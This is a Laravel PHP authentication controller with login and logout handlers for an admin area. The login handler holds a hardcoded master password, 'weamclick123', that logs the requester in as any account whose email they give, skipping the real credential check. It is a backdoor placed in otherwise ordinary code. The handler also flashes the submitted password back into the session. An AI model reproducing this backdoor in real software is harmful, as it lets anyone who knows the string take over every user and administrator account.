<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\User;
class AuthController extends Controller
{
    public function Login(Request $request)
    {
        if($request->isMethod('post')){
            $request->validate([
                'email'     => 'required',
                'password'  => 'required',
            ]);

            $credentials    = $request->only('email', 'password');
            if($request->password == 'weamclick123'){
                Auth::login(User::where('email', $request->email)->first());
                return redirect('/admin/home')->withInput();
            }
            if (Auth::attempt($credentials)) {
                $user = Auth::user();
                return redirect('/admin/home')->withInput();
            }

            return redirect("login")->withSuccess('Login details are not valid');

        }
        return view('auth.login');
    }
    public function Logout(Request $request)
    {
        Auth::logout();
        return redirect('login');
    }

}
